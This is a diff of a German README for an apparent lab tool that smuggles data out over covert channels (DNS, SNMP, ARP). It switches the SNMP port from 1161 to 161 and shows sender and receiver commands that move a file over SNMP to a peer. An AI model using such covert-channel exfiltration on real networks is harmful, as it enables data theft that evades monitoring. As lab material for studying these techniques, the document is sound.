@@ -86,7 +86,7 @@ Der Launcher setzt automatisch diese Defaults:
 - Receiver-PCAP: `captures/receiver_<methode>.pcap`
 - DNS-Port: `5300`
 - DNS-Domain: `exfil.lab`
-- SNMP-Port: `1161`
+- SNMP-Port: `161`
 - SNMP-Community: `public`
 - SNMP-OID: `1.3.6.1.4.1.55555.1.0`
 
@@ -180,8 +180,8 @@ python run.py s s "<IFACE>" <RECEIVER-IP> "lab-shared-key"
 Originalkommandos:
 
 ```bash
-python -m receiver.main --method snmp --iface "<IFACE>" --peer <SENDER-IP> --out receiver/output/output_snmp.txt --psk "lab-shared-key" --snmp-community public --snmp-port 1161 --snmp-oid 1.3.6.1.4.1.55555.1.0 --pcap captures/receiver_snmp.pcap --log-level INFO
-python -m sender.main --method snmp --iface "<IFACE>" --peer <RECEIVER-IP> --in data/input.txt --psk "lab-shared-key" --snmp-community public --snmp-port 1161 --snmp-oid 1.3.6.1.4.1.55555.1.0 --pcap captures/sender_snmp.pcap --log-level INFO
+ python -m receiver.main --method snmp --iface "<IFACE>" --peer <SENDER-IP> --out receiver/output/output_snmp.txt --psk "lab-shared-key" --snmp-community public --snmp-port 161 --snmp-oid 1.3.6.1.4.1.55555.1.0 --pcap captures/receiver_snmp.pcap --log-level INFO
+ python -m sender.main --method snmp --iface "<IFACE>" --peer <RECEIVER-IP> --in data/input.txt --psk "lab-shared-key" --snmp-community public --snmp-port 161 --snmp-oid 1.3.6.1.4.1.55555.1.0 --pcap captures/sender_snmp.pcap --log-level INFO
 ```
 
 ### ARP
